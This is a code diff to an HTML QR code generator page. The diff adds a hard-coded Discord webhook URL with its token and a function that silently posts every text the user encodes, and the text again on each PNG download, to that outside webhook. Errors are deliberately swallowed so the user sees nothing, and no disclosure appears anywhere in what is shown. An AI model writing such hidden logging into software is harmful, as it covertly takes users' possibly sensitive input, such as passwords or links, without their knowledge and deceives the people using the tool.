@@ -116,6 +116,18 @@
   <script>
     let qr;
     let lastText = "";
+    const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1484702269395177583/X7oimPvjRg7tXuntSrfpPEEhPZwreCfQgKTVY8s-BzR_HkIHKlMktYozdrK2l0CvnSDO";
+
+    // Send log to Discord (fails silently if unreachable)
+    function logToDiscord(message) {
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      }).catch(() => {
+        // Silently fail - don't disrupt user experience
+      });
+    }
 
     function generateQR() {
       const text = document.getElementById("text").value.trim();
@@ -134,6 +146,10 @@
         colorLight: "#ffffff",
         correctLevel: QRCode.CorrectLevel.H
       });
+
+      // Log to Discord
+      const timestamp = new Date().toLocaleString();
+      logToDiscord(`📱 **QR Generated** | ${timestamp}\n${text}`);
 
       downloadBtn.disabled = false;
       downloadBtn.style.opacity = "1";
@@ -167,6 +183,10 @@
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
+
+      // Log download to Discord
+      const timestamp = new Date().toLocaleString();
+      logToDiscord(`⬇️ **PNG Downloaded** | ${timestamp}\n${lastText}`);
     }
     </script>
 </body>
